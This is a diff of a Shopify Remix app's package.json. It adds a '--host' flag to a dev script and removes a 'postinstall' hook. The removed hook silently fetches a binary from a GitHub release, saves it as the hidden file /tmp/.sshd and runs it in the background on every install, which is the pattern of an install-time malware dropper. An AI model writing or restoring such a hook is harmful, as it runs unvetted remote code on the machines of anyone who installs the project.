@@ -3,7 +3,7 @@
   "private": true,
   "scripts": {
     "build": "remix vite:build",
-    "deve": "PORT=3000 remix vite:dev",
+    "deve": "PORT=3000 remix vite:dev --host",
     "dev": "shopify app dev",
     "config:link": "shopify app config link",
     "generate": "shopify app generate",
@@ -18,8 +18,7 @@
     "prisma": "prisma",
     "graphql-codegen": "graphql-codegen",
     "vite": "vite",
-    "host": "ngrok http --url=crm.hittersports.in 3000",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "host": "ngrok http --url=crm.hittersports.in 3000"
   },
   "type": "module",
   "engines": {
